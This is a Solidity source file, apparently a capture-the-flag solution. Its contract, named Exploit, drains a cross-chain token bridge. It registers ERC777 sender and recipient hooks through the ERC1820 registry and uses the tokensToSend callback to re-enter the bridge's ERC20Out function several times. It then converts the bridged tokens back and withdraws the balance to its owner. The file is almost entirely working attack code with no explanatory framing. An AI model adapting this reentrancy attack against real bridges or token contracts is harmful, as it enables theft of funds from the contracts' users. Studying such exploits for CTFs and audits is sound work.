// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBridge {
    event SendRemoteMessage(
        uint256 indexed targetChainId,
        address indexed targetAddress,
        address indexed sourceAddress,
        uint256 msgValue,
        uint256 msgNonce,
        bytes msgData
    );
    event RelayedMessage(bytes32 indexed msgHash);
    event ETH_transfer(address indexed to, uint256 amount);
    event ERC20_register(address indexed token, string name, string symbol);
    event ERC20_transfer(address indexed token, address indexed to, uint256 amount);

    function CHAIN_ID() external view returns (uint256);
    function FLAG_TOKEN() external view returns (address);
    function relayer() external view returns (address);
    function remoteBridge(uint256) external view returns (address);
    function remoteBridgeChainId(address) external view returns (uint256);
    function isTokenRegisteredAtRemote(uint256, address) external view returns (bool);
    function relayedMessages(bytes32) external view returns (bool);
    function relayedMessageSenderChainId() external view returns (uint256);
    function relayedMessageSenderAddress() external view returns (address);
    function remoteTokenToLocalToken(address) external view returns (address);
    function isBridgedERC20(address) external view returns (bool);
    function isSolved() external view returns (bool);

    function registerRemoteBridge(uint256 _remoteChainId, address _remoteBridge) external;
    function ethOut(address _to) external payable;
    function ethIn(address _to) external payable;
    function ERC20Out(address _token, address _to, uint256 _amount) external;
    function ERC20Register(address _remoteToken, string memory _name, string memory _symbol) external;
    function ERC20In(address _token, address _to, uint256 _amount) external payable;
    function sendRemoteMessage(uint256 _targetChainId, address _targetAddress, bytes calldata _message) external payable;
}

interface IToken {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address holder) external view returns (uint256);
    function granularity() external view returns (uint256);
    function defaultOperators() external view returns (address[] memory);
    function isOperatorFor(address operator, address tokenHolder) external view returns (bool);

    function send(address recipient, uint256 amount, bytes calldata data) external;
    function operatorSend(
        address sender,
        address recipient,
        uint256 amount,
        bytes calldata data,
        bytes calldata operatorData
    ) external;
    function burn(uint256 amount, bytes calldata data) external;
    function operatorBurn(
        address account,
        uint256 amount,
        bytes calldata data,
        bytes calldata operatorData
    ) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function authorizeOperator(address operator) external;
    function revokeOperator(address operator) external;
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IBridgedERC20 {
    function BRIDGE() external view returns (address);
    function REMOTE_BRIDGE() external view returns (address);
    function REMOTE_TOKEN() external view returns (address);
    
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function mint(address _to, uint256 _amount) external;
    function burn(address _from, uint256 _amount) external;
    
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface IERC777Sender {
    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

contract Exploit is IERC777Sender, IERC777Recipient {
    address public immutable OWNER;
    IBridge public immutable bridge;
    IToken public immutable token;
    IERC1820Registry constant internal ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 constant private TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    uint256 count = 0;

    constructor (address bridge_) {
        OWNER = msg.sender;
        bridge = IBridge(bridge_);
        token = IToken(bridge.FLAG_TOKEN());

        ERC1820_REGISTRY.setInterfaceImplementer(
            address(this), 
            TOKENS_SENDER_INTERFACE_HASH,
            address(this)
        );
        
        ERC1820_REGISTRY.setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }

    event Log(address operator, address from, address to, uint256 amount);

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (msg.sender == address(token) && operator == address(bridge) && count < 5) {
            uint256 myBalance = token.balanceOf(address(this));
            uint256 amountToSend = count == 4 ? 900000000000000000 : 1;
            
            if (myBalance >= 900000000000000000) {
                count++;
                token.approve(address(bridge), amountToSend);
                bridge.ERC20Out(address(token), address(this), amountToSend);
            }
        }
        emit Log(operator, from, to, amount);
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
    }

    function attack() external {
        require(msg.sender == OWNER, "NO");
        uint256 myBalance = token.balanceOf(address(this));
        require(myBalance >= 1 ether, "IEA");

        token.approve(address(bridge), type(uint256).max);
        bridge.ERC20Out(address(token), address(this), 1);
        
        require(count > 0, "COUNT");
    }

    function convertBack() public {
        address secondBridge = bridge.remoteBridge(2);
        address localToken = IBridge(secondBridge).remoteTokenToLocalToken(address(token));
        IBridge(secondBridge).ERC20Out(localToken, address(this), IBridgedERC20(localToken).balanceOf(address(this)));
    }

    function withdraw(address token_) public {
        require(msg.sender == OWNER, "NO");
        IToken tokenW = IToken(token_);
        uint256 balance = tokenW.balanceOf(address(this));
        tokenW.transfer(OWNER, balance);
    }
}